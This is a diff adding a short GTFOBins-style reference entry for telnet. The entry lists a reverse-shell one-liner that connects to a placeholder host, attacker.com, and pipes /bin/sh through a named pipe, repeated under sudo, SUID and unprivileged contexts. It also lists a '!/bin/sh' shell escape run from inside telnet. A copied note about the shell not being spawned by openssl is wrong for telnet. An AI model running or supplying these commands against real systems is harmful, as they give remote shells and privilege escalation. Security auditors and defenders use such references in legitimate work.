@@ -1,0 +1,35 @@
+telnet
+======
+
+Reverse shell
+-------------
+
+[Sudo]
+    mkfifo /path/to/temp-socket
+telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket
+    The shell process is not spawn by `openssl`.
+
+[SUID]
+    mkfifo /path/to/temp-socket
+telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket
+    The shell process is not spawn by `openssl`.
+
+[Unprivileged]
+    mkfifo /path/to/temp-socket
+telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket
+    The shell process is not spawn by `openssl`.
+
+Shell
+-----
+
+[Sudo]
+    telnet
+!/bin/sh
+
+[SUID]
+    telnet
+!/bin/sh
+
+[Unprivileged]
+    telnet
+!/bin/sh
